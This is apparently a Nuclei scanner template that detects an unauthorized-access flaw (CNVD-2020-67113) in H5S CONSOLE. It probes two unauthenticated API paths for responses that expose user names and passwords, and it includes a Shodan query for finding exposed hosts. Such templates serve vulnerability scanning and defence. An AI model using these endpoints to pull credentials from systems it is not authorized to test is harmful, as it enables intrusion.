id: CNVD-2020-67113
info:
  author: ritikchaddha
  description: Zero Vision Technology (Shanghai) Co., Ltd. H5S CONSOLE Exists Unauthorized
    Access Vulnerability
  metadata:
    shodan-query: http.title:"H5S CONSOLE"
  name: H5S CONSOLE Unauthorized Access Vulnerability (CNVD-2020-67113)
  reference:
  - https://vul.wangan.com/a/CNVD-2020-67113
  severity: high
  tags: h5s,unauth,h5sconsole,cnvd,cnvd2020
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - strUser
    - strPasswd
  - condition: or
    part: body
    type: word
    words:
    - H5_AUTO
    - H5_DEV
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/v1/GetSrc'
  - '{{BaseURL}}/api/v1/GetDevice'
  stop-at-first-match: true
